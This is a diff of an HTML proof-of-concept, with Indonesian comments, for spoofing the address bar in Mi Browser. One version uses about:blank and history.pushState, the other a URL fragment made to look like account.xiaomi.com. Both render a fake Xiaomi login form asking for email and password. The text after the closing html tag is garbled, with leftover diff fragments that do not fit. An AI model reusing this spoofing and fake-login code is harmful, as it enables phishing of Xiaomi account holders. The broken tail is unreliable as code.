@@ -1,40 +1,32 @@
 <!DOCTYPE html>
 <html>
-<body>
-<button id="btn" style="padding:20px;background:red;color:white;font-size:20px">
-KLIK SERANG v2 - about:blank
-</button>
+<head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
+<body style="margin:0;font-family:sans-serif">
 <script>
-document.getElementById('btn').onclick = function(){
-  // 1. Buka about:blank dulu (ini origin kosong, boleh di-write)
-  let w = window.open("about:blank", "_blank");
+// INI KUNCINYA - gak ganti domain, cuma nambahin # yang mirip xiaomi.com
+// Jadi gak ke-block SecurityError
+history.replaceState({}, "", "/#https://account.xiaomi.com/login/session-expired");
 
-  // 2. Tulis fake login Xiaomi di about:blank
-  w.document.write(`
-    <html><head><meta name="viewport" content="width=device-width"></head>
-    <body style="font-family:sans-serif;padding:20px">
-      <h1 style="color:red">LOGIN TIMEOUT</h1>
-      <p>Domain di address bar akan jadi <b>account.xiaomi.com</b> padahal ini konten palsu dari about:blank</p>
-      <input placeholder="Email" style="width:100%;padding:12px;margin:8px 0"><br>
-      <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0"><br>
-      <button style="width:100%;padding:15px;background:blue;color:white">LOGIN (PALSU)</button>
-      <p id="urlinfo"></p>
-      <script>
-        // 3. INI KUNCINYA - Spoof address bar jadi xiaomi.com
-        history.pushState({},"","https://account.xiaomi.com/login");
-        document.getElementById("urlinfo").innerText = "URL sekarang: " + location.href;
-      <\/script>
-    </body></html>
-  `);
-  w.document.close();
-}
+document.write(`
+  <div style="padding:20px">
+    <h1 style="color:red">LOGIN TIMEOUT</h1>
+    <p>Lihat address bar di atas bro!</p>
+    <p style="background:#eee;padding:10px;word-break:break-all">
+      URL sekarang: ${location.href}<br>
+      Di layar HP kecil, yang keliatan cuma ekornya: <b>account.xiaomi.com/login/session-expired</b>
+    </p>
+    <input placeholder="Email" style="width:100%;padding:12px;margin:8px 0"><br>
+    <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0"><br>
+    <button style="width:100%;padding:15px;background:blue;color:white">LOGIN (PALSU)</button>
+    <p style="margin-top:20px;color:gray;font-size:12px">
+      PoC bonex1927 - Mi Browser 14.62.1-gn<br>
+      Full URL: https://bonex1927.github.io/#https://account.xiaomi.com/login/...
+    </p>
+  </div>
+`);
 </script>
 </body>
-</html>      // Kalo ke-block cross-origin, coba teknik fallback blob
-      alert("Direct write di-block: "+e+", coba fallback blob");
-      let html = `<h1>LOGIN TIMEOUT</h1><p>Fallback - Spoof via blob</p><script>history.pushState({},"","https://account.xiaomi.com/login")<\/script>`;
-      let blob = new Blob([html], {type:"text/html"});
-      let url = URL.createObjectURL(blob);
+</html>      let url = URL.createObjectURL(blob);
       w.location = url;
     }
   }, 800);
